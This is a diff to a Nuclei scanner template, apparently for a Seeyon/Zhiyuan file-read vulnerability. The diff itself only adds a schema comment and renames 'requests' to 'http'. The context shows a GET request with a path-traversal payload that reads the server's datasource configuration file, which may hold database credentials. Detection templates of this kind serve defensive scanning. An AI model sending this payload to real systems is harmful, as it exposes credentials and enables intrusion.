@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: zhiyuan-fileRead
 
 info:
@@ -6,7 +7,7 @@ info:
   severity: high
   tags: zhiyuan,fileRead
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties"
